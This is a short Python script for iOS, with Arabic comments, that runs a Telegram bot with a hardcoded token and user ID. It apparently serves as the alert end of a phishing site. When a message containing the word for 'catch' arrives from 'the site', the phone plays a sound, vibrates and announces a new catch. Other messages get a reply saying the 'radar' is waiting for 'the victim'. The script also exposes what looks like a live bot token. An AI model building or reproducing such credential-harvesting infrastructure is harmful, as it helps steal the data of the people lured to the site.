import telebot
import sound
import speech
import console

# بياناتك
TOKEN = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg'
MY_ID = 5811700860
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(func=lambda m: True)
def handle_capture(message):
    # إذا كانت الرسالة جاية من الموقع (تحتوي على كلمة صيد)
    if "صيد" in message.text:
        # 1. تنبيه صوتي عالي
        sound.play_effect('digital:PowerUp')
        # 2. اهتزاز الجوال
        console.vibrate()
        # 3. نطق الكلام
        speech.say("يا وحش وصل صيد جديد", 'ar-SA', 0.5)
        
        print(f"✅ تم استلام الصيد بنجاح: \n{message.text}")
    else:
        bot.reply_to(message, "📡 الرادار شغال.. بانتظار دخول الضحية.")

print("🚀 بوت الرادار شغال الآن.. جرب أدخل بياناتك في موقعك وشف الإشعار!")
bot.polling(none_stop=True)
